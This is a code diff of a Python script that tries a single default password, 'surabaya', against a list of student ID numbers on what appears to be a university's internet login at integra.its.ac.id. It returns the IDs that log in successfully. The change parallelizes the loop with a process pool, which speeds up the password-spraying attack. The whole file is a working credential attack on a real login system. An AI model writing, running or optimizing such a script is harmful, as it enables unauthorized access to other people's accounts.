@@ -7,7 +7,7 @@ import requests
 from Crypto.Cipher import PKCS1_v1_5
 from Crypto.PublicKey import RSA
 from bs4 import BeautifulSoup
-from multiprocessing import Pool
+from multiprocessing import Pool, cpu_count
 
 session = requests.Session()
 session.headers.update({
@@ -23,7 +23,7 @@ INTEGRA_BASE = 'https://integra.its.ac.id/'
 URL_PATTERN = re.compile(r"URL=([^'>]+)")
 
 
-def process_login(nrp,login_url: str=INTERNET_LOGIN) -> bool:
+def process_login(nrp, login_url: str = INTERNET_LOGIN) -> bool:
     global session
     response = session.get(INTERNET_LOGIN)
     if response.status_code != 200:
@@ -40,13 +40,13 @@ def process_login(nrp,login_url: str=INTERNET_LOGIN) -> bool:
     rsa_pub_key = RSA.importKey(pubkey)
     cipher = PKCS1_v1_5.new(rsa_pub_key)
 
-    plain_text = nrp+ "|||" + "surabaya"
+    plain_text = nrp + "|||" + "surabaya"
     encrypted = cipher.encrypt(plain_text.encode())
     encrypted = base64.encodebytes(encrypted).decode().strip()
     form_data = {'content': encrypted, 'p': '', 'n': ''}
     response = session.post(LOGIN_POST, data=form_data)
 
-    if len(URL_PATTERN.findall(response.text)) >0:
+    if len(URL_PATTERN.findall(response.text)) > 0:
         pass
     else:
         return False
@@ -58,26 +58,24 @@ def process_login(nrp,login_url: str=INTERNET_LOGIN) -> bool:
 
     soup = BeautifulSoup(response.content, 'html.parser')
     if 'Logout' in soup.text:
-        print('login berhasil')
         return True
     return False
+
 
 def loginer(nrp):
     global session
     hasil = process_login(nrp)
     session.cookies.clear()
-    return hasil
+    if hasil:
+        return nrp
+
 
 def main(nrp_txt_path):
-
     koleksi_nrp = open(nrp_txt_path).read().splitlines()
-    i = 0
-    hore = []
-    jumlah_berhasil = 0
-
-    for nrp in tqdm(koleksi_nrp):
-        if loginer(nrp):
-            hore.append(nrp)
+    with Pool(cpu_count()) as p:
+        hasil = list(
+            tqdm(p.imap(loginer, koleksi_nrp), total=len(koleksi_nrp)))
+    print([h for h in hasil if h])
 
 
 if __name__ == '__main__':
